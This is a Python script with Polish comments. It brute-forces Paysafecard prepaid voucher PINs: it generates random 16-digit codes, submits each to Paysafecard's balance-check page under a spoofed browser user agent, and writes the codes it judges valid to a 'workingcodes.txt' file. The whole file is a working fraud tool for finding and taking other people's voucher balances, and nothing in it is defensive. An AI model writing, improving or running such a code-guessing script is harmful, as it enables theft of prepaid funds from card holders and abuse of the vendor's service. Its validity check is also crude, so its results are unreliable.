import requests
from bs4 import BeautifulSoup
import random
import string

def sprawdz_kod_psc(kod):
    # Ustawienie user agenta
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    
    # Adres URL do sprawdzania kodu PSC
    url = "https://www.paysafecard.com/pl/sprawdzanie-dostepnych-srodkow/"
    
    # Przygotowanie danych do wysłania
    data = {
        'pin': kod,
        'submit': 'Sprawdź saldo'
    }
    
    # Wykonanie żądania POST
    response = requests.post(url, headers=headers, data=data)
    
    # Sprawdzenie statusu odpowiedzi
    if response.status_code == 200:
        # Przetwarzanie odpowiedzi
        soup = BeautifulSoup(response.text, 'html.parser')
        result = soup.find('div', {'class': 'c-form-checker__result'})
        
        if result:
            if "jest niepoprawny" in result.text:
                return False
            else:
                return True
        else:
            return False
    else:
        return False

def generuj_kod():
    kod = '0'  # Początkowa cyfra to 0
    kod += ''.join(random.choices(string.digits, k=15))  # Pozostałe 15 cyfr losowo wybierane
    return kod

def zapisz_do_pliku(kody):
    with open('workingcodes.txt', 'w') as file:
        for kod in kody:
            file.write(kod + '\n')

# Główny program
def main():
    ilosc_kodow = int(input("Ile kodów chcesz sprawdzić: "))
    znalezione_kody = []
    licznik_prawidlowych_kodow = 0
    
    while len(znalezione_kody) < ilosc_kodow:
        kod_psc = generuj_kod()
        print("Sprawdzam kod:", kod_psc)
        if sprawdz_kod_psc(kod_psc):
            print("Znaleziono prawidłowy kod:", kod_psc)
            znalezione_kody.append(kod_psc)
            licznik_prawidlowych_kodow += 1
        else:
            print("Kod jest nieprawidłowy.")
    
    print("Liczba znalezionych prawidłowych kodów:", licznik_prawidlowych_kodow)
    
    if znalezione_kody:
        zapisz_do_pliku(znalezione_kody)
        print("Prawidłowe kody zostały zapisane do pliku 'workingcodes.txt'.")

if __name__ == "__main__":
    main()
